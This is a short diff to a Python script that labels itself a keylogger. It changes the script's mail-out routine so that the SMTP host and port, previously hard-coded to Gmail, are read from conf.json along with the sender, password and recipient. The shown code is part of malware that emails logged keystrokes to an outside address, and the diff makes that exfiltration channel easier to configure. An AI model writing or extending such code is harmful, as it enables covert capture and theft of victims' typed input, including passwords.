@@ -109,7 +109,7 @@ def send_mail() -> None:
   """
   try:
     print("Initialize and login gmail server")
-    server = SMTP(host="smtp.gmail.com", port=587)
+    server = SMTP(host=SMTP_HOST, port=SMTP_PORT)
     server.ehlo()
     server.starttls(context=create_default_context())
     server.ehlo()
@@ -164,6 +164,8 @@ if __name__ == "__main__":
   log_f.write(f"\n\n「Keylogger started {get_time(day=True)}」\n")
   with open("conf.json") as f:
     data = load(f)
+    SMTP_HOST = data["smtp_host"]
+    SMTP_PORT = data["smtp_port"]
     SENDER = data["sender"]
     SMTP_PASSWORD = data["smtp_password"]
     RECIPIENT = data["recipient"]
